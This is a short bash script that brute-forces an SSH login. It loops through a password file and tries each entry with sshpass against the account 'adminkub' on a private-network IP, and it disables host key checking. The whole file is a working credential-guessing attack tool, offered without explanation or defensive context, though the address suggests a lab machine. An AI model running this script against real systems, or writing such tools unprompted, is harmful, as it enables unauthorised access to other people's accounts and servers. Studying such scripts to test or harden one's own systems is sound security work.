#!/bin/bash

TARGET_IP="192.168.122.168"   
USERNAME="adminkub"            
PASSWORD_LIST="passwords.txt" 

if [ ! -f "$PASSWORD_LIST" ]; then
    echo "Error: File $PASSWORD_LIST not found!"
    exit 1
fi

while read -r PASSWORD; do
    echo "Trying password: $PASSWORD"
    sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 $USERNAME@$TARGET_IP "echo 'Login Success'" &> /dev/null
    
    if [ $? -eq 0 ]; then
        echo "[+] Password Found: $PASSWORD"
        exit 0
    fi
done < "$PASSWORD_LIST"

echo "[-] Password not found in list"
exit 1

